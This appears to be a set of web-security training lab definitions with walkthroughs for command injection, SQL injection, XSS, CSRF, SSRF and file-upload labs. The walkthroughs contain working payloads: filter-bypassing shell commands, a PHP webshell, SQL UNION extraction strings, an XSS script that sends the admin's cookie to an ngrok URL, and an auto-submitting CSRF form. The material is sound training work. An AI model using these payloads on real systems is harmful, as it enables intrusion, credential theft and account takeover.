title: Lab 03: Command execution basic testing
description: This lab is vulnerable to Command Injection with 4 different levels. For each level, you need to create a file `flagX.txt` under /tmp with X equals to that level(For example: flag1.txt at level 1)
guide:
1. Nothing is filter, solution: `touch /tmp/flag1.txt` (in username)  
2.['&&',';','\','/'] are filtered, solution: `touch $(echo . | tr '!-0' '"-1')tmp$(echo . | tr '!-0' '"-1')flag2.txt`  
3.['&&','&',';','|','-','$','(',')','`','||','/','\'] are filtered, solution: `touch ${HOME:0:1}tmp${HOME:0:1}flag3.txt`  
4.??:D?!!<>

title: Lab 04: Tamper data from web using temper
description: This lab is designed for you to be familiar with the proxy tool. You can use anything you have to wrap the HTTP request (Burp Suite, ZAP, Developer tool, ... or writing yourself a script). You are give a credential User1:password to access a blog website. Try to complete the lab!

steps.description: Add the new header with key is 'X-kbk-xyz' and access /homepage
Can you see how the post is indexed, find the secret one!
Look like developer forgot to delete something

guide:
1. Send the *GET* request at `/homepage` to burp repeater (or any similar tool) and add *`X-kbk-xyz`* as a new header with any value (Ex: X-kbk-xyz: easy_step-1).  
2. Did you see that each post is indexed by the path `/posts/:postid`? Use Burp Intruder to find out other secret post. You will find it in `/posts/10`.  
3. You should find that developer has forgot to delete that comment in html response at `/posts/10`, find and access that secret path at `/kbk/youfoundmysecretpath`.  
4. Sometime there are many methods on the same endpoint (REST), use Burp Intruder and try to change the method *`GET`* to *`DELETE`* at `/posts/10`

title: Lab 05: XPATH injection
description: This lab is vulnerable to XPATH injection. You need to login as admin to complete the lab

title: Lab 08 Unrestricted File Upload
description: This lab has 3 different levels for file upload, to complete the lab you need to upload successfully a webshell and use it to create file flagX.txt in tmp and click on button 'Check Point'.
guide:
1. Create a file with `php extension` (example: `shell.php`) with the following content:  
       `<?php echo "Shell:";system($_GET['cmd']); ?>`  
   The file is now uploading to `/uploads/shell.php`  
   Go to there and try to execute some command  
   - Current localtion: example.com/uploads/shell.php?cmd=pwd  
List all file:example.com/uploads/shell.php?cmd=ls+-al  
   To complete task 1: example.com/uploads/shell.php?cmd=touch+/tmp/flag1.txt  
   Back to upload site and click 'Check point'  
2. The server checks the Content-Type -> in the uploading request changes 'Content-Type' header to 'image/jpeg'  
3. The server checks the MIME number of the file: add '89 50 4E 47 0D 0A 1A 0A' to the prefix of the content of file (hexa)

title: Lab 09: Normal SQL injection
description: This lab is vulnerable to SQLi with easy level, try to complete it :D

steps.description: Bypass authentication with SQLi payload in username
Bypass authentication with SQLi payload in username
Extract the real credetial and login with it

guide:
### Walkthrough:  
1. In username: `admin' OR 1=1#` (let the password empty)  
2. In password: `aaaaa' OR '1'='1`  
3. - Determine number of columns by `UNION query`, in search: `1080' UNION SELECT null#`, the server returns sql error. Increase the number of 'null' you will see that with query `1080' UNION SELECT null,null,null#` the server won't raise error anymore (which mean the vulnerable query returns 3 columns in response table)  
 - Determine the name of database: `1080' UNION SELECT schema_name,null,null FROM information_schema.schemata#`  
 - Determine the name of table: `' UNION SELECT null,table_schema,table_name FROM information_schema.tables WHERE table_schema = 'test_mysql'#`  
 - Determine the name of column: `a' UNION SELECT column_name,table_name,null FROM information_schema.columns WHERE table_schema = 'test_mysql'#`  
 - Now we have enough informations about the database, time to extract its data: `aa' UNION SELECT user_name,user_password,null FROM users#`  
 Login with that credential to complete the last step

title: Lab 11: Automated SQL Injection with SQLMap
Lab 14: Reflected XSS
description: This lab is vulnerable to XSS. There is an admin that stands behind the web and checks every URL you report. To complete the lab you need to grab his cookie and use it to access /homepage

steps.description: Only one mission: obtain the admin cookie and access /homepage with it

title: Lab 15: Stored XSS
description: This lab is vulnerable to XSS. There is an admin that stands behind the web and checks the content of /homepage every 2 minutes. To complete the lab you need to grab his cookie and use it to access /posts/search. Use the following credential: `User1:password`

steps.description: Only one mission: obtain the admin cookie and access /posts/search with it

guide:
### Requirements:  
 - Burpsuite and a browser has configured [proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox)  
 - [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary (If you has Burpsuite Pro, use Burp Collaborator instead)  
### Walkthrough:   
 - Take a look on comment function and try to input `'"><script>alert(1)</script>`, you will see an alert is opened, like this   
 ![1](/public/15/1.jpg)   
 - As mentioned in the description, other users are using the web, try to grab there cookie  
 - Open terminal and run this: `python3 -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  
 ![2](/public/15/2.jpg)   
 - Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  
 ![3](/public/15/3.jpg)   
 - You will receive a public url like the this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  
 - In commnent, input the following: `'"><script>document.location="YOUR_URL_HERE?c="+document.cookie</script>`, remember to replace YOUR_URL_HERE with above url and wait for 2 minutes or more 
 ![4](/public/15/4.jpg)   
 - the secret cookie returns like above take it and add as a new cookie, send it to /posts/search, use burp repeater as below  
 ![5](/public/15/5.jpg)

title: Lab 18: CSRF with browser
description: This lab is vulnerable to CSRF in change password function, try to change password of User2 and login. Admin of the site with username 'User2' is standing behind the web and checking every url you provide. Credential: User1:password
guide:
### Requirements:  
 - Burpsuite and a browser has configured [proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox)  
 - [Python3](https://www.python.org/downloads/) and [ngrok](https://ngrok.com/), make sure you have authenticated ngrok binary  
### Walkthrough:  
 - Walk around the website you will found the function 'change password' is missing crsf token   
 - Create a file with .html extension (ex: index.html) with the following content  
 `<html>`  
 `<body>`  
 `<script>history.pushState('', '', '/')</script>`  
 `<form action="https://*.kbklab.tech/changePassword" method="POST">`  
 `<input type="hidden" name="newPassword" value="123456789" />`  
 `<input type="submit" value="Submit request" />`  
 `</form>`  
 `<script>document.forms[0].submit(); </script></body></html>`  
 Or you can download it [here](/public/18/index.html)  
 - Change the url and the password in index.html to your.  
 - Open the terminal, go to the folder that contains the index.html and run `python -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  
 ![2](/public/15/2.jpg)  
 Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  
 ![3](/public/15/3.jpg)   
 - You will receive a public url like the this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  
  - In function 'Report URL', submit your URL with the index.html and wait a bit(Ex:https://aaaa.ngrok.io/index.html), you will see there is a connection to your site like this   
 ![1](/public/18/1.jpg)  
 - If it won't work or take too long -> DO IT AGAIN AND AGAIN  
 - Now, password of User2 has changed to the one in index.html  
 - Logout and login with User2 to complete the lab

title: Lab 20: SSRF
description: This website is a web proxy, input an URL and it will get the content of that website for you. But it is vulnerable to SSRF, try to access internal website to complete the lab
guide:
### Requirements:  
 - Burpsuite and a browser has configured [proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox)  
### Walkthrough:  
 - The proxy will take a url and return its content.  
 - You will see the POST request to /getContent in 'Proxy' tab, right-click on the request and choose 'Send to Intruder'  
 - Try to enumerate local port by enter `http://localhost:<port>` to find which one is opened (Use python or burp intruder):  
        - In Intruder tab, you will see the previous request in 'Position' subtab.  
        - Click 'Clear'  
        - In url, input: `http://localhost:` and click 'Add' twice, your intruder will look like this  
 ![1](/public/20/1.jpg)   
        - Go to 'Payload' subtab, in Payload Sets > Payload type, select 'Numbers'  
        - Input as below to enum all 16 bit of ports  
 ![2](/public/20/2.jpg)   
 - Click 'Start Attack', after the run is completed, sort the result by length, you will see there are a secret port inside   
 ![3](/public/20/3.jpg)  
 - Now you have the port, try to access it file robots.txt `http://localhost:<port>/robots.txt`, you will see there is an disallow path, access it you can finish the lab
